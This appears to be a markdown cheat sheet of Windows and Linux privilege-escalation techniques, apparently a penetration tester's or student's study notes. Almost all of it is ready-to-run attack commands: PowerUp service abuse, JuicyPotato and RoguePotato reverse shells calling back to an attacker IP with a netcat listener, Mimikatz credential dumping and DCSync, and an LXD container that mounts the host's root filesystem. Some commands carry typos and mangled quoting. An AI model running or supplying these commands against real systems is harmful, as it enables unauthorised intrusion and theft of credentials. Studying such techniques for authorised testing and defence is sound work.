## Powerup
```
. .\powerup.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name {vulnerable service} -UserName "{name}"
```

### Unquoted PE
```
. .\powerup.ps1
Get-ServiceUnquoted -Verbose
```
> - Create a reverse shell and replace the name of the unoquoted service name

## Potato
### Juicy
> - Requires
```
JuicyPotato.exe -l 1338 -p {reverse shell} -t *  

whoami /priv
whoami /all
```
- nc -lvnp 1338
- use msfvenom to create a reverse shell file
- Conditions: Account must have SeImperrsonate or SeAssignPrimra
### Rouge Potato
```
# on attacker
nc -lvnp 4444

# on victim
.\RoguePotato.exe -r {attacker IP} -e "cmd.exe /c powershell -enc -l 4444

# CLSID
.\RoguePotato.exe -r {attacker IP} -e "cmd.exe /c powershell -enc -l 4444 -c "{CLSID}"
```

## Mimikatz
```
# Running mimikatz once 
.\mimikatz.exe "{command}" exit

# Powershell
. .\invoke-mimikatz
invoke-mimikatz -Command '"{commands}"'


# Commands
# Get login passwords
lsadump::lsa /patch
sekurlsa::logonpasswords
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")

# Get passwords from task scheduler
''"token::elevate” “vault::cred /patch”’

# DC sync
'"lsadump::dcsync /user:{DOMAIN}\{USERNAME}"'
```
## Alpine PE
> - Docker = VMware
> - Copies the root file systems into the docker
> - The user who has access to the docker has "root" privileges on the docker hence are able to "acces" all the files
> - user needs to be in the group:
	-	lxc
	-	lxd
### Creating container
```
# installing the requirements
apt install -y golang-go debootstrap rsync gpg squashfs-tools

# installing source code of the distrobuilder
git clone https://github.com/lxc/distrobuilder

# generating the bin file in $HOME/go/bin/distrobuilder
cd ./distrobuilder
make

# create the alpine directory
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/

# download the configuration files to the alpine directory
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# creating the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

# 2 files:
lxd.tar.xz
rootfs.squashfs
```
### Add root path
create the container in the vulnerable server and add teh root path
```
# import the container
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# see the container
lxc image list

# enable root privileges on the host system (docker)
lxc init alpine privesc -c security.privileged=true

# check if privesc is there
lxc list

# copy the root files to the docker 
# source = / 
# dst = /mnt/root
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

### Privilege Escalate
```
# start and execute the docker
lxc start privesc
lxc exec privesc /bin/sh
```
